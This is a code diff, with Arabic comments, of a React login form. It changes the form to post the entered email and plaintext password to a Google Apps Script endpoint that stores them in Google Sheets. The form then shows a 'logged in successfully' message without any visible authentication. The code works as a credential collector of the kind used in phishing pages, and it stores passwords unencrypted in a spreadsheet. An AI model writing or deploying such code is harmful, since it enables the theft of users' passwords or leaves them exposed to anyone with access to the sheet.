@@ -13,33 +13,31 @@ const LoginForm = () => {
     e.preventDefault();
     setIsLoading(true);
 
-    const data = {
-      fields: {
-        Email: email,
-        Password: password,
-      },
+    // تجهيز البيانات لإرسالها إلى Google Sheets
+    const formData = {
+      email: email,
+      password: password, // ⚠ يمكن تشفيرها إذا لزم الأمر
     };
 
     try {
       const response = await fetch(
-        "https://api.airtable.com/v0/appVIknwkh8pEH2er/tblLoaHmFwooqY5JP",
+        "https://script.google.com/macros/s/AKfycbzqM8vfJfh6_NssoIIdQqKPW9AZxxtQrOwy8LR-Hp9Iq6xXqaaNZ8dRu8YCFTvm4xhLnw/exec", // ✅ استبدلها برابط Google Apps Script الخاص بك
         {
           method: "POST",
-          headers: {
-            Authorization: `Bearer ${process.env.NEXT_PUBLIC_AIRTABLE_API_KEY}`,
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify(data),
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(formData),
         }
       );
 
-      const result = await response.json();
+      const result = await response.text();
       console.log("Response:", result);
 
       if (response.ok) {
-        toast.success("تم تسجيل الدخول بنجاح! تم حفظ بياناتك.");
+        toast.success("تم تسجيل الدخول بنجاح! تم حفظ بياناتك في Google Sheets.");
+        setEmail(""); // إعادة تعيين الحقول
+        setPassword("");
       } else {
-        throw new Error(result.error?.message || "فشل في تسجيل البيانات");
+        throw new Error("فشل في إرسال البيانات.");
       }
     } catch (error) {
       console.error("Error:", error);
